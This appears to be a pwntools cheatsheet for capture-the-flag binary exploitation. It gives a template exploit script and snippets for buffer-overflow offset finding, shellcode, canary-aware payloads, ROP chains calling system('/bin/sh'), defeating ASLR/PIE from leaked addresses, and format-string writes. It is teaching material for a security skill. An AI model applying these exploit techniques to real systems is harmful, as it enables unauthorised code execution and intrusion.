# pwntools Cheatsheet

## Overview

```python
from pwn import *
```

## [Template Script](./Templates/pwn.py)

```python

# Switches
from re import S
import sys

# pwn
from pwn import *


# ::::::::::::::::::::::::: CONFIG :::::::::::::::::::::::::
PATH = 'Chals'
BINARY = '<challenge>'
HOST = '<ip/domain>:<port>'
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::

def pwn(switch):
    
    if (switch == '-r'):
        host = HOST.split(':')
        proc = remote(host[0], int(host[1]))

    elif (switch == '-ld'):
        binary = f'./{PATH}/{BINARY}'
        proc = process(binary)
        gdb.attach(proc)
        # pause()
    else:
        binary = f'./{PATH}/{BINARY}'
        proc = process(binary)

    ## get da banner
    print(proc.recvline())



if __name__ == "__main__":

    if (len(sys.argv) < 2 or len(sys.argv) > 2):
        print(f'''

        
  __                        
  \ \   _ ____      ___ __  
   \ \ | '_ \ \ /\ / / '_ \ 
   / / | |_) \ V  V /| | | |
  /_/  | .__/ \_/\_/ |_| |_|
       |_|                  

        usage :: python3 {sys.argv[0]} [options]

        :::::::::::::::::: [options] ::::::::::::::::::

        -l, --local         run against local binary
        -ld, --local-debug  run debugger with binary
        -r, --remote        run against remote binary 

        ''')
        exit(0)
    else:
        pwn(sys.argv[1])

```


## Common Tasks

### Making Connections

```python
# local
# proc = process('./<binary>')
proc = process('./challenge1')

# remote
# proc = remote('domain.com', port)
proc = remote('hackme.com', 2048)
```

### Passing Banners

```python
# proc.recvuntil('some string/pattern')
proc.recvuntil('welcome to the challenge, please enter a name: ')
```

### Sending data

```python
# proc.sendline(payload)
proc.sendline(b'A' * 42)
```

### Catching Shells

```python
proc.interactive()
```

### Finding Offsets

```python
test_buffer_len = 42
test_offset = cyclic(test_buffer_len)
# >> test_offset = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka'

# the byte sequence that overwrote the return pointer
eip_overwritten_bytes = b'aaah'
offset = cyclic_find(eip_overwritten_bytes)
# >> offset = 25
```

### Packing Addresses

```python

# p32(0xaddress)
return_ptr = p32(0x08048536)
```

### Unpacking Addresses

```python
# u32(b'byte-sequence')
str_bytes = u32(b'abcd')
```

### Shellcode

```python
"""
shellcode = asm('''
    x86 instructions
''')
"""

shellcode += asm('''
	xor ebx, ebx

    mov eax, SYS_read
    mov ebx, 0x3e8
    mov ecx, esp
    mov edx, 0xbe
    int 0x80

    mov eax, SYS_write
    mov ebx, 0x1
    mov edx, 0xbe
    mov ecx, esp
    int 0x80
''')
```

### ELF Hooks

```python

elf_binary = ELF('./<binary>')

win_addr = hex(elf_binary.symbols['win'])

printf_got_addr = hex(elf_binary.got['printf'])

printf_plt_addr = hex(elf_binary.plt['printf'])
```

### Fit/Flat

+ Quickly build payload which automatically adjusts for specified padding length

```python
# fills the length amount of bytes with garbage padding
payload = fit({
    0x6c-0xc: p32(canaryValue),
    0x6c: p32(elf.symbols['win'])
}, length=0x6c + 4)   # -> padding

p.sendline(payload) # whoo
p.interactive()

```

+ combo it

```python
payload = fit({
    0x6c-0xc: p32(canaryValue),
    0x6c: p32(elf.symbols['win'])
}, length=cyclic_find(b'aala'))   # -> padding

p.sendline(payload)
p.interactive()
```


## Logging & Debugging

### Debug mode

```shell
$ python3 exploit.py DEBUG
```

### Detailed Logs

```python
context.log_level = 'debug'
```

### Custom Logs

```python
log.info(f'Win @ {win_addr}')
```

### Logging Off

```python
logging.disable()
```




## General

### `flat`

```python
payload = flat({
    # pad with garbage to this offset
    cyclic_find('amia'): rop.chain()
})
```

**custom filler**

```python
alphabet = 'bcdefhijklmnopqrstuvwyz'     # cleansed alphabet

payload = fit({
    cyclic_find('nbbb', alphabet=bet): rop.chain()
}, filler=alphabet)
```

### `logging`

```python
log.info(f"Data section @ {data_section}")
log.success(f"Leaked libc system @ {libc_system_addr}")
```

### `sections`

```python
data_section = elf.symbols.data_start
```

### `rebase`

```python
libc.address = leaked_setbuf_libc - libc.symbols['setbuf']
elf.address = leaked_menu_address - elf.symbols['menu']

# now we have defeated PIE/ASLR globally
```


### `unpacking`

```python
leak_addr = u32(proc.recvline(keepends=False)[:4])
```


## ROP

### `raw`


```python
rop = ROP(binary)

rop.raw([
    pop_eax_edx,
    'flag',
    0x0
])

```

### `libc.search`

```python
libc = ELF('<some-libc>.so')

# Its an iterator guys
next(libc.search(b'/bin/sh'))
```

### `call`

```python
rop = ROP('<some-libc>.so')

rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
```


### `function`

```python
rop = ROP(binary)

# call function in symbols table with args
rop.some_function(arg1, arg2)
```


## Format Strings

### `fmtstr_payload`

*Note: this function often writes too much data corrupting the stack, stay tuned for a post on writing your own more reliable function.*

```python
payload = fmtstr_payload(bytes_offset, {target_addr: addr_val}, numbwritten=1, write_size='byte')
```